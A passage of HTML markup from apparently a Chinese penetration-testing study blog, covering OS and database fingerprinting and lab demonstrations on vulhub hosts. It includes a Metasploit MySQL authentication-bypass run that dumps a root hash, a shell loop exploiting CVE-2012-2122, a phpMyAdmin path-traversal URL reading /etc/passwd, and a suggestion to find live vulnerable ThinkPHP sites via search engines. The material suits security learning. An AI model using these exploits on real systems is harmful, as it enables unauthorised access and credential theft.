operator">=</span>N%T<span class="token operator">=</span>80%IPL<span class="token operator">=</span>164%UN<span class="token operator">=</span>0%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%OS:T<span class="token operator">=</span>80%CD<span class="token operator">=</span>Z<span class="token punctuation">)</span></code></pre><p>c、TTL</p><pre class=" language-不同的操作系统的默认TTL值是不同的，"><code class="language-不同的操作系统的默认TTL值是不同的，">1、WINDOWS NT/2000   TTL：1282、WINDOWS 95/98     TTL：323、UNIX              TTL：2554、LINUX             TTL：645、WIN7           TTL：64</code></pre><p>d、特殊端口 如（22 &#x2F; 139 &#x2F; 445 &#x2F; 1433 &#x2F; 3389）</p><h4 id="2、简要两者区别及识别意义"><a href="#2、简要两者区别及识别意义" class="headerlink" title="2、简要两者区别及识别意义"></a><font size="4"><strong>2、简要两者区别及识别意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">区别出不同的操作系统才能对症下药、因为windows和linux的漏洞是不一样的、可能windows的漏洞在windows上就不能运用，</code></pre><h4 id="3、操作系统层面漏洞类型对应意义"><a href="#3、操作系统层面漏洞类型对应意义" class="headerlink" title="3、操作系统层面漏洞类型对应意义"></a><font size="4"><strong>3、操作系统层面漏洞类型对应意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">不同的漏洞会造成不同漏洞利用的条件</code></pre><h4 id="4、简要操作系统层面漏洞影响范围"><a href="#4、简要操作系统层面漏洞影响范围" class="headerlink" title="4、简要操作系统层面漏洞影响范围"></a><font size="4"><strong>4、简要操作系统层面漏洞影响范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">有些漏洞会对操作系统造成崩溃、而有些系统只是蓝屏、或者是权限的提升</code></pre><h3 id="二、数据库层面"><a href="#二、数据库层面" class="headerlink" title="二、数据库层面"></a><font size="5"><strong>二、数据库层面</strong></font></h3><h4 id="1、识别数据库类型常见方法"><a href="#1、识别数据库类型常见方法" class="headerlink" title="1、识别数据库类型常见方法"></a><font size="4"><strong>1、识别数据库类型常见方法</strong></font></h4><p>默认的语言搭配的数据库</p><pre class=" language-bash"><code class="language-bash">组合类型asp + access/mssql组合类型php + mysql 组合类型aspx+mssql组合类型jsp +mysql/oracle组合类型Python + MongoDB</code></pre><p>常见的数据库默认端口号</p><pre class=" language-bash"><code class="language-bash">关系型数据库  mysql3306  sqlserver1433  oracle1521  psotgresql5432非关系型数据库  MongoDB27017  Redis6379  memcached11211其他：  1527　　      Derby  5432　　      pgsql  5000　　      db2  9092　　      pointbase  无默认　      Informix</code></pre><h4 id="2、数据库类型区别及识别意义"><a href="#2、数据库类型区别及识别意义" class="headerlink" title="2、数据库类型区别及识别意义"></a><font size="4"><strong>2、数据库类型区别及识别意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。不同的数据库的攻击方式也不完全一样。</code></pre><h4 id="3、数据库常见漏洞类型及攻击"><a href="#3、数据库常见漏洞类型及攻击" class="headerlink" title="3、数据库常见漏洞类型及攻击"></a><font size="4"><strong>3、数据库常见漏洞类型及攻击</strong></font></h4><pre class=" language-bash"><code class="language-bash">存在弱口令数据库漏洞</code></pre><h4 id="4、简要数据库层面漏洞影响范围"><a href="#4、简要数据库层面漏洞影响范围" class="headerlink" title="4、简要数据库层面漏洞影响范围"></a><font size="4"><strong>4、简要数据库层面漏洞影响范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库权限网站权限修改网页内容</code></pre><h3 id="三、第三方层面"><a href="#三、第三方层面" class="headerlink" title="三、第三方层面"></a><font size="5"><strong>三、第三方层面</strong></font></h3><h4 id="1、如何判断有那些第三方平台或软件"><a href="#1、如何判断有那些第三方平台或软件" class="headerlink" title="1、如何判断有那些第三方平台或软件"></a><font size="4"><strong>1、如何判断有那些第三方平台或软件</strong></font></h4><pre class=" language-bash"><code class="language-bash">通过网站去扫描有些网站安装了第三方的软件如phpmyadmin通过扫描就可以发现他的安装目录判断安装了第三方软件端口扫描nmap -O -sV 10.1.1.130Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-08 09:26 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.130 <span class="token punctuation">(</span>10.1.1.130<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.00085s latency<span class="token punctuation">)</span>.Not shown: 978 closed portsPORT     STATE SERVICE     VERSION21/tcp   <span class="token function">open</span>  <span class="token function">ftp</span>         vsftpd 2.3.422/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>23/tcp   <span class="token function">open</span>  telnet      Linux telnetd25/tcp   <span class="token function">open</span>  smtp        Postfix smtpd80/tcp   <span class="token function">open</span>  http        Apache httpd 2.2.8 <span class="token punctuation">((</span>Ubuntu<span class="token punctuation">)</span> DAV/2<span class="token punctuation">)</span>111/tcp  <span class="token function">open</span>  rpcbind     2 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>139/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>445/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>512/tcp  <span class="token function">open</span>  exec?513/tcp  <span class="token function">open</span>  login?514/tcp  <span class="token function">open</span>  tcpwrapped1099/tcp <span class="token function">open</span>  java-rmi    GNU Classpath grmiregistry1524/tcp <span class="token function">open</span>  bindshell   Metasploitable root shell2049/tcp <span class="token function">open</span>  nfs         2-4 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100003)</span>2121/tcp <span class="token function">open</span>  <span class="token function">ftp</span>         ProFTPD 1.3.13306/tcp <span class="token function">open</span>  mysql       MySQL 5.0.51a-3ubuntu55432/tcp <span class="token function">open</span>  postgresql  PostgreSQL DB 8.3.0 - 8.3.75900/tcp <span class="token function">open</span>  vnc         VNC <span class="token punctuation">(</span>protocol 3.3<span class="token punctuation">)</span>6000/tcp <span class="token function">open</span>  X11         <span class="token punctuation">(</span>access denied<span class="token punctuation">)</span>6667/tcp <span class="token function">open</span>  irc         UnrealIRCd8009/tcp <span class="token function">open</span>  ajp13       Apache Jserv <span class="token punctuation">(</span>Protocol v1.3<span class="token punctuation">)</span>8180/tcp <span class="token function">open</span>  http        Apache Tomcat/Coyote JSP engine 1.1</code></pre><h4 id="2、简要为什么要识别第三方平台或软件"><a href="#2、简要为什么要识别第三方平台或软件" class="headerlink" title="2、简要为什么要识别第三方平台或软件"></a><font size="4"><strong>2、简要为什么要识别第三方平台或软件</strong></font></h4><pre class=" language-bash"><code class="language-bash">不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多</code></pre><h4 id="3、常见第三方平台或软件漏洞类型及攻击"><a href="#3、常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="3、常见第三方平台或软件漏洞类型及攻击"></a><font size="4"><strong>3、常见第三方平台或软件漏洞类型及攻击</strong></font></h4><pre class=" language-bash"><code class="language-bash">弱口令软件的漏洞攻击</code></pre><h4 id="4、简要第三方平台或软件安全测试的范围"><a href="#4、简要第三方平台或软件安全测试的范围" class="headerlink" title="4、简要第三方平台或软件安全测试的范围"></a><font size="4"><strong>4、简要第三方平台或软件安全测试的范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">直接获取到软件的权限便于进一步的提权和攻击</code></pre><p>补充<br>除去常规wEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了wEB应用或其他安全问题。所以明确安全测试思路是很重要的!</p><h3 id="四、演示案例"><a href="#四、演示案例" class="headerlink" title="四、演示案例"></a><font size="5"><strong>四、演示案例</strong></font></h3><h4 id="1、上述涉及的基础知识"><a href="#1、上述涉及的基础知识" class="headerlink" title="1、上述涉及的基础知识"></a><font size="4"><strong>1、上述涉及的基础知识</strong></font></h4><h4 id="2、演示某操作系统层面漏洞"><a href="#2、演示某操作系统层面漏洞" class="headerlink" title="2、演示某操作系统层面漏洞"></a><font size="4"><strong>2、演示某操作系统层面漏洞</strong></font></h4><h4 id="3、演示某数据库弱口令及漏洞演示"><a href="#3、演示某数据库弱口令及漏洞演示" class="headerlink" title="3、演示某数据库弱口令及漏洞演示"></a><font size="4"><strong>3、演示某数据库弱口令及漏洞演示</strong></font></h4><p><font size="3"><strong>方法1</strong></font></p><p>漏洞探测</p><pre class=" language-bash"><code class="language-bash">参考文档：https://vulhub.org/<span class="token comment" spellcheck="true">#/environments/mysql/CVE-2012-2122/</span>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># nmap -O -sV 10.1.1.133</span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-08 11:09 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.133 <span class="token punctuation">(</span>10.1.1.133<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.Not shown: 998 closed portsPORT     STATE SERVICE VERSION22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.4 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>3306/tcp <span class="token function">open</span>  mysql   MySQL 5.5.23MAC Address: 00:0C:29:13:E9:61 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux 3.X<span class="token operator">|</span>4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 1.88 seconds</code></pre><p>漏洞利用</p><pre class=" language-bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary/scanner/mysql/mysql_authbypass_hashdumpmsf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> rhosts 10.1.1.133rhosts <span class="token operator">=</span><span class="token operator">></span> 10.1.1.133msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> threads 10threads <span class="token operator">=</span><span class="token operator">></span> 10msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 The server allows logins, proceeding with bypass <span class="token function">test</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 10% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 20% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 30% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 40% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 50% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 60% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 70% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 80% complete<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Successfully bypassed authentication after 847 attempts. URI: mysql://root:DBrmCST@10.1.1.133:3306<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Successfully exploited the authentication bypass flaw, dumping hashes<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Hash Table has been saved: /root/.msf4/loot/20210608111341_default_10.1.1.133_mysql.hashes_091970.txt<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - Scanned 1 of 1 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completedmd5在线解密https://www.cmd5.com/</code></pre><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/2.png"></p><pre class=" language-bash"><code class="language-bash">└─<span class="token comment" spellcheck="true"># mysql -uroot -p123456 -h10.1.1.133</span>Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or \g.Your MySQL connection <span class="token function">id</span> is 886Server version: 5.5.23 Source distributionCopyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show databases<span class="token punctuation">;</span>+--------------------+<span class="token operator">|</span> Database           <span class="token operator">|</span>+--------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span><span class="token operator">|</span> performance_schema <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">test</span>               <span class="token operator">|</span>+--------------------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.001 sec<span class="token punctuation">)</span></code></pre><p><font size="3"><strong>方法2</strong></font></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># for i in `seq 1 1000`;do mysql -uroot -pwrong -h 10.1.1.133 -P 3306; done                                                                                                      130 ⨯</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or \g.Your MySQL connection <span class="token function">id</span> is 1553Server version: 5.5.23 Source distributionCopyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span></code></pre><h4 id="4、某第三方应用安全漏洞演示"><a href="#4、某第三方应用安全漏洞演示" class="headerlink" title="4、某第三方应用安全漏洞演示"></a><font size="4"><strong>4、某第三方应用安全漏洞演示</strong></font></h4><p><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a><br>环境搭建</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 CVE-2018-12613<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># pwd</span>/opt/vulhub/vulhub-master/phpmyadmin/CVE-2018-12613<span class="token punctuation">[</span>root@hdss7-11 CVE-2018-12613<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose up -d</span></code></pre><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/3.png"></p><p>漏洞利用<br><a href="http://10.1.1.133:8080/?target=db_sql.php%253f/../../../../../../../../etc/passwd">http://10.1.1.133:8080/?target=db_sql.php%253f/../../../../../../../../etc/passwd</a></p><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/4.png"></p><h3 id="五、涉及资源："><a href="#五、涉及资源：" class="headerlink" title="五、涉及资源："></a><font size="5"><strong>五、涉及资源：</strong></font></h3><p><a href="https://nmap.org/">https://nmap.org/</a><br><a href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a><br><a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-004</title>
      <link href="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/"/>
      <url>/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-WEB源码拓展"><a href="#基础入门-WEB源码拓展" class="headerlink" title="基础入门-WEB源码拓展"></a><font size="6"><strong>基础入门-WEB源码拓展</strong></font></h2><span id="more"></span><h3 id="一、WEB源码拓展"><a href="#一、WEB源码拓展" class="headerlink" title="一、WEB源码拓展"></a><font size="5"><strong>一、WEB源码拓展</strong></font></h3><pre class=" language-bash"><code class="language-bash">    前言:WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</code></pre><h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a><font size="4"><strong>知识点：</strong></font></h4><p>1、关于WEB源码目录结构<br>2、关于WEB源码脚本类型<br>3、关于WEB源码应用分类<br>4、关于WEB源码其他说明</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#数据库配置文件，后台目录，模版目录，数据库目录等</span><span class="token comment" spellcheck="true">#ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题</span><span class="token comment" spellcheck="true">#社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</span><span class="token comment" spellcheck="true">#开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</span><span class="token comment" spellcheck="true">#关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站，各种行业对应</span><span class="token comment" spellcheck="true">#总结:</span>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方法想办法获取<span class="token operator">!</span></code></pre><p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/1.png"></p><h3 id="二、演示案例"><a href="#二、演示案例" class="headerlink" title="二、演示案例"></a><font size="5"><strong>二、演示案例</strong></font></h3><h4 id="1、asp、php等源码测试"><a href="#1、asp、php等源码测试" class="headerlink" title="1、asp、php等源码测试"></a><font size="4"><strong>1、asp、php等源码测试</strong></font></h4><h4 id="2、平台识别-某CMS无漏洞-默认数据库平台"><a href="#2、平台识别-某CMS无漏洞-默认数据库平台" class="headerlink" title="2、平台识别-某CMS无漏洞-默认数据库平台"></a><font size="4"><strong>2、平台识别-某CMS无漏洞-默认数据库平台</strong></font></h4><p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/2.png"><br><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/3.png"><br>在线cms识别网站</p><table>    <thead>        <tr>            <th>网站</th>            <th>优点</th>            <th>缺点</th>        </tr>    </thead>    <tbody>        <tr>            <td>https://www.yunsee.cn/</td>            <td>相应的速度快</td>            <td>企业版收费</td>        </tr>        <tr>            <td>http://whatweb.bugscaner.com/</td>            <td>可以在线和多个cms识别</td>            <td>广告</td>        </tr>    </tbody></table><h4 id="3、源码应用针对漏洞"><a href="#3、源码应用针对漏洞" class="headerlink" title="3、源码应用针对漏洞"></a><font size="4"><strong>3、源码应用针对漏洞</strong></font></h4><pre class=" language-bash"><code class="language-bash">niushop电商类关注漏洞点-业务逻辑参考地址：https://www.niushop.com.cn/download.html电商类网站的主要漏洞就是网站的支付问题。</code></pre><h4 id="4、简要目标识别源码获取"><a href="#4、简要目标识别源码获取" class="headerlink" title="4、简要目标识别源码获取"></a><font size="4"><strong>4、简要目标识别源码获取</strong></font></h4><pre class=" language-bash"><code class="language-bash">本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析http://weipan.1016sangshen.cn/ 内部搭建的靶场人人工爆框架–搜索特定url（输入index/login/login/token搜索有漏洞的网站，还可以搜网站文件名如arc.listview.class.php）–获取其他相符站点-漏洞测试借助特定行业源码或咸鱼进行搜索获取–本地搭建–代码审计或其他还可以把url放到ThinkPHP进行漏洞检测、命令执行、getshell；可以尝试去搜索引擎搜一下index/login/login/token，找到对应网站再放到thnkphp中检测</code></pre><h3 id="三、涉及资源"><a href="#三、涉及资源" class="headerlink" title="三、涉及资源"></a><font size="5"><strong>三、涉及资源</strong></font></h3><p>搜十二堂源码下载站<br>咸鱼获取源码</p><p>云悉指纹识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></p><p>CMS识别工具（如果失效就去小迪博客里找）：<br><a href="https://w.ddosi.workers.dev/">https://w.ddosi.workers.dev/</a><br><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a><br><a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a><br><a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></p><p>语言与框架（还包含内网渗透等web安全知识）：<a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p><p>另外还有windows靶机集合部分源码，在群文件靶机目录下载文本文件</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-003</title>
      <link href="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/"/>
      <url>/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-搭建安全拓展"><a href="#基础入门-搭建安全拓展" class="headerlink" title="基础入门-搭建安全拓展"></a><font size="6"><strong>基础入门-搭建安全拓展</strong></font></h2><span id="more"></span><h3 id="一、涉及知识"><a href="#一、涉及知识" class="headerlink" title="一、涉及知识"></a><font size="5"><strong>一、涉及知识</strong></font></h3><ol><li>常见搭建平台脚本启用</li><li>域名IP目录解析安全问题</li><li>常见文件后缀解析对应安全</li><li>常见安全测试中的安全防护</li><li>WEB后门与用户及文件权限</li></ol><h3 id="二、常见的问题"><a href="#二、常见的问题" class="headerlink" title="二、常见的问题"></a><font size="5"><strong>二、常见的问题</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ASP,PHP,ASPx,JSP,PY,JAVAWEB等环境</span><span class="token comment" spellcheck="true">#WEB源码中敏感文件</span>后台路径，数据库配置文件，备份文件等<span class="token comment" spellcheck="true">#ip或域名解析wEB源码目录对应下的存在的安全问题</span>域名访问，IP访问（结合类似备份文件目录<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#脚本后缀对应解析（其他格式可相同-上传安全)</span><span class="token comment" spellcheck="true">#存在下载或为解析问题</span><span class="token comment" spellcheck="true">#常见防护中的IP验证，域名验证等</span><span class="token comment" spellcheck="true">#后门是否给予执行权限</span><span class="token comment" spellcheck="true">#后门是否给予操作目录或文件权限#后门是否给予其他用户权限</span><span class="token comment" spellcheck="true">#总结下关于可能会存在的安全或防护问题?</span></code></pre><h3 id="三、web权限的设置"><a href="#三、web权限的设置" class="headerlink" title="三、web权限的设置"></a><font size="5"><strong>三、web权限的设置</strong></font></h3><pre class=" language-bash"><code class="language-bash">   在一般的情况下我们会对某个目录取消执行权限、最典型的就是图片目录这个目录只放图像没有脚本我们会取消执行的权限、这样我们可以防范一部分的文件上传漏洞、即使开发写的代码有问题也不会导致服务器出现安全事故。   绕过方法：     如果我们上传的文件如果不能正常的执行那么将文件放在其他目录、例如网站的根目录下面</code></pre><h3 id="四、演示案例-环境搭建"><a href="#四、演示案例-环境搭建" class="headerlink" title="四、演示案例-环境搭建"></a><font size="5"><strong>四、演示案例-环境搭建</strong></font></h3><h4 id="1、PHPinfo"><a href="#1、PHPinfo" class="headerlink" title="1、PHPinfo"></a><font size="4"><strong>1、PHPinfo</strong></font></h4><p>● 基于中间件的简要识别<br>一般可以通过抓包的方式分析出是什么类型的服务器和中间件<br><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/1.png"><br>可以看见在自己搭建的平台看见使用的apache(windows) php7.3<br>● 基于中间件的安全漏洞<br>可以根据在第一步上面收集到的信息、去找Apache的漏洞和PHP的漏洞</p><p>● 